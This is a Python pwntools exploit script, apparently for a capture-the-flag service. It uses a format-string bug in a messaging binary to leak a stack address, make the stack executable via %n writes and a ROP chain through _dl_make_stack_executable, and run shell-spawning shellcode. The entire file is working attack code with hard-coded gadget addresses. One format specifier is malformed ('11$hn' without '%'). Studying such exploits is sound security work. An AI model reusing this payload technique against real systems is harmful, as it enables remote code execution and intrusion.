from pwn import *

def write_to_file(file_name, data):
    with open(file_name, "wb+") as f:
        f.write(data)

def send_msg(p, msg):
    p.recvuntil("Quit\n")
    p.sendline("1")
    p.recvuntil("message: ")
    p.sendline(msg)

def del_msg(p):
    p.recvuntil("Quit\n")
    p.sendline("2")
    p.recvuntil("cleared.")

def print_msg(p):
    p.recvuntil("Quit\n")
    p.sendline("4919")
    return p.recvline()

def quit(p):
    p.recvuntil("Quit\n")
    p.sendline("3")

def extract_stack(p):
    stack_addrs = []
    for i in range(1, 1000):
        send_msg(p, "%{}$p".format(i))
        stack_addrs.append("stack[{:03}] -> {}".format(i, print_msg(p).strip()))

    print("\n".join(stack_addrs))

def main():
    #p = process("./msg")
    p = remote("ncsc.ccis.no", 4141)
    #p = gdb.debug("./msg")
    #extract_stack(p)
    #p.interactive()


    # Send message to leak first addr on stack
    send_msg(p, "%p")
    leaked_stack_ptr = int(print_msg(p).strip(), 16)
    print("Leaked pointer on stack: 0x{:x}".format(leaked_stack_ptr))

    # Compute difference between leaked stack ptr and loc of return addr
    pre_leaked_ptr = 0xffffd450
    pre_leaked_ret_loc = 0xffffd40c
    pre_difference = pre_leaked_ptr - pre_leaked_ret_loc

    # Use leaked stack ptr and pre computed difference
    ret_addr_ptr = leaked_stack_ptr - pre_difference

    stack_prot_addr = 0x080ebfac
    stack_exec_size_addr = 0x80ec9a8
    _dl_make_stack_executable = 0x080a1a20
    #print("Make stack executable: {}".format(hex(_dl_make_stack_executable)))
    #print("Stack prot addr: {}".format(hex(stack_prot_addr)))

    # First - set stack protection to rwx
    set_stack_prot_0x7 = p32(stack_prot_addr) + "%{}c".format(0x7-4) + "%4$n" + " %1$p %2$p %3$p"
    send_msg(p, set_stack_prot_0x7)
    print(print_msg(p))
    del_msg(p)

    # Then set the stack protection addr to 0x00004000
    set_exec_size_addr_0x4000 = p32(stack_exec_size_addr+1) + "%{}c".format(0x40-4) + "%4$n"
    send_msg(p, set_exec_size_addr_0x4000)
    print(print_msg(p))
    del_msg(p)



    # Exploit shits
    pop_ret_gadget = 0x080b9736
    addr_to_libc_stack_end = 0x080ebf88
    addr_to_dl_make_stack_executable = 0x080a1a20
    addr_to_shellcode_on_stack = leaked_stack_ptr + 200

    pop_ret_gadget_upper = (pop_ret_gadget & 0xffff0000) >> 16
    pop_ret_gadget_lower = (pop_ret_gadget & 0x0000ffff)
    addr_to_libc_stack_end_upper = (addr_to_libc_stack_end & 0xffff0000) >> 16
    addr_to_libc_stack_end_lower = (addr_to_libc_stack_end & 0x0000ffff)
    addr_to_dl_make_stack_executable_upper = (addr_to_dl_make_stack_executable & 0xffff0000) >> 16
    addr_to_dl_make_stack_executable_lower = (addr_to_dl_make_stack_executable & 0x0000ffff)
    addr_to_shellcode_on_stack_upper = (addr_to_shellcode_on_stack & 0xffff0000) >> 16
    addr_to_shellcode_on_stack_lower = (addr_to_shellcode_on_stack & 0x0000ffff)

    exec_up = addr_to_dl_make_stack_executable_upper
    ret_up = pop_ret_gadget_upper
    stack_up = addr_to_libc_stack_end_upper
    shell_lo = addr_to_shellcode_on_stack_lower
    exec_lo = addr_to_dl_make_stack_executable_lower
    ret_lo = pop_ret_gadget_lower
    stack_lo = addr_to_libc_stack_end_lower
    shell_up = addr_to_shellcode_on_stack_upper

    assert(exec_up < ret_up)
    assert(ret_up < stack_up)
    assert(stack_up < shell_lo)
    assert(shell_lo < exec_lo)
    assert(exec_lo < ret_lo)
    assert(ret_lo < stack_lo)
    assert(stack_lo < shell_up)

                  # LOWER              # UPPER
    payload = p32(ret_addr_ptr) + p32(ret_addr_ptr+2)      # Pop_ret_gadget
    payload += p32(ret_addr_ptr+4) + p32(ret_addr_ptr+6)   # libc_stack_end
    payload += p32(ret_addr_ptr+8) + p32(ret_addr_ptr+10)  # make_stack_exe
    payload += p32(ret_addr_ptr+12) + p32(ret_addr_ptr+14) # stack_shelcode
    payload += "%{}c".format(exec_up-len(payload)) + "%9$hn"
    payload += "%{}c".format(ret_up - exec_up) + "%5$hn"
    payload += "%{}c".format(stack_up - ret_up) + "%7$hn"
    payload += "%{}c".format(shell_lo - stack_up) + "%10$hn"
    payload += "%{}c".format(exec_lo - shell_lo) + "%8$hn"
    payload += "%{}c".format(ret_lo - exec_lo) + "%4$hn"
    payload += "%{}c".format(stack_lo - ret_lo) + "%6$hn"
    payload += "%{}c".format(shell_up - stack_lo) + "11$hn"
    payload += p32(0x90909090) * 30
    payload += encoders.encoder.line(asm(shellcraft.sh()))

    print("Setting rop chain at: 0x{:x}".format(ret_addr_ptr))
    print("Setting up stack:\n\t0x{:x}\n\t0x{:x}\n\t0x{:x}\n\t0x{:x}".format(pop_ret_gadget, addr_to_libc_stack_end, addr_to_dl_make_stack_executable, addr_to_shellcode_on_stack))

    print("payload length: {}".format(len(payload)))
    print(payload)
    send_msg(p, payload)
    p.interactive()


if __name__ == "__main__":
    main()

